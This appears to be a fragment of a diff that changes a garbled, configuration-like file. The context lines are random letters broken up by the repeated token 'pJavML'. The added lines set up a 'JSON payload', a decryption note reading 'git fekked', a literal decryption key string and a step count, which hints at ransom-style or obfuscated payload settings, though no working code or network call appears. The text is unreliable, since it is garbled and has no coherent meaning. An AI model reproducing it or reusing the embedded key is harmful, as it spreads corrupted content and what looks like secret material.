@@ -36,4 +36,7 @@ pJavML
 wAa: apJavMLqzvA
 CpJavMLEx: WrLpJavMLzaGvaAYpJavMLaoF}%_%pJavML({
 
-{13,cwaizy,7}
+[USE_AS_JSON_PAYLOAD => {13,cwaizy,7}]
+[USE_DCRPTNOTE => "git fekked"]
+[USE_DCRPTKEY => "yRwu2dB3NOWW3FfxQTKzXegF"];
+[USE_DCRPTSTEPS => 4]
